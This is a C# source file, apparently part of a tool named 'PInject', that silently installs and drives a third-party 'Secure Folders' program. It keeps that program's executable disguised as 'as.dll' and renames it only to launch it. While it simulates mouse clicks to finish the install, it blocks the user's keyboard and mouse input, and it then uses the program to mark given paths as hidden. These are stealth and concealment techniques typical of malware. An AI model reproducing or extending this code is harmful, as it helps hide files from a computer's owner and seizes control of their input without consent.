using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PInject
{
    class ControlSecureFolder
    {
        [DllImport("user32.dll")] static extern void mouse_event(int flag, int dx, int dy, int buttons, int extra);
        [DllImport("user32")] public static extern int GetWindowRect(IntPtr hwnd, ref Rectangle lpRect);
        [DllImport("user32")] public static extern IntPtr FindWindow(String lpClassName, String lpWindowName);
        [DllImport("user32.dll")] private static extern bool SetForegroundWindow(IntPtr hWnd);
        public static void InstallSecureFolder()
        {
            File.Move(Application.StartupPath + "\\as.dll", Application.StartupPath + "\\as.exe");
            Process.Start(Application.StartupPath + "\\as.exe");
            File.Move(Application.StartupPath + "\\as.exe", Application.StartupPath + "\\as.dll");
            IntPtr hWnd;
            while ((hWnd = FindWindow(null, "Secure Folders")) == IntPtr.Zero) ; //Wait for Secure Folders to open
            NativeMethods.BlockInput(true);
            Thread.Sleep(200);
            SetForegroundWindow(hWnd);
            Rectangle Rt = default;
            GetWindowRect(hWnd, ref Rt);
            Cursor.Position = new Point(Rt.Left + 307, Rt.Top + 47);
            mouse_event(2, 0, 0, 0, 0);
            mouse_event(4, 0, 0, 0, 0);
            Thread.Sleep(100);
            foreach (Process p in Process.GetProcessesByName("as"))
                p.Kill();
            NativeMethods.BlockInput(false);
            SecureFolderState(false);
            return;
        }

        public static void SecureFolderState(bool On)
        {
            if (On)
            {
                File.Move(Application.StartupPath + "\\as.dll", Application.StartupPath + "\\as.exe");
                Process.Start(Application.StartupPath + "\\as.exe", "/protection on");
                File.Move(Application.StartupPath + "\\as.exe", Application.StartupPath + "\\as.dll");
            }
            else
            {
                File.Move(Application.StartupPath + "\\as.dll", Application.StartupPath + "\\as.exe");
                Process.Start(Application.StartupPath + "\\as.exe", "/protection off");
                File.Move(Application.StartupPath + "\\as.exe", Application.StartupPath + "\\as.dll");
            }
        }

        public static void SecureFolderAdd(string path)
        {
            File.Move(Application.StartupPath + "\\as.dll", Application.StartupPath + "\\as.exe");
            Process.Start(Application.StartupPath + "\\as.exe", "/setitem \"" + path + "\" Hidden");
            File.Move(Application.StartupPath + "\\as.exe", Application.StartupPath + "\\as.dll");
        }
    }
}
public partial class NativeMethods
{
    [DllImport("user32.dll", EntryPoint = "BlockInput")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
}